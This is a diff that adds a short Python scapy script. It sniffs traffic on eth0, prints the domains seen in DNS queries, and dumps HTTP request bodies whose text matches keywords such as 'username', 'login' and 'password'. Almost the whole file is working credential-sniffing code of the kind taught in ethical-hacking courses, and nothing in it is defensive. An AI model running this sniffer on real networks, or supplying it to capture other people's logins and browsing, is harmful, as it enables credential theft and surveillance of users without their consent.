@@ -1,0 +1,43 @@
+import scapy.all as scapy
+from scapy.layers import http
+from scapy.all import  DNS, DNSQR
+def sniff(interface):
+    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
+def get_url(packet):
+    if packet.haslayer(DNS) and packet[DNS].opcode == 0:
+        # print(packet.show())
+        query_name = packet[DNSQR].qname.decode()
+        # print(f"Visited website: {query_name}")
+        return query_name
+def get_login_info(packet):
+    if packet.haslayer(http.HTTPRequest):
+        if packet.haslayer(scapy.Raw):
+            load=packet[scapy.Raw].load
+            keywords = ["uname","username","user","login","pass","password"]
+            for keyword in keywords:
+                if keyword in str(load):
+                    return(load)
+def process_sniffed_packet(packet):
+    domain = get_url(packet)
+    if domain:
+        print(f"Visited website: {domain}")
+    login = get_login_info(packet)
+    if login:
+        print("Login info ", login)
+        
+    # if packet.haslayer(DNS) and packet[DNS].opcode == 0:
+    #     # print(packet.show())
+    #     query_name = packet[DNSQR].qname.decode()
+    #     print(f"Visited website: {query_name}")
+    # if packet.haslayer(http.HTTPRequest):
+    #     if packet.haslayer(scapy.Raw):
+    #         load=packet[scapy.Raw].load
+    #         keywords = ["uname","username","user","login","pass","password"]
+    #         for keyword in keywords:
+    #             if keyword in str(load):
+    #                 print(load)
+
+
+sniff("eth0")
+
+# if packet.haslayer(DNS) and packet[DNS].opcode == 0:
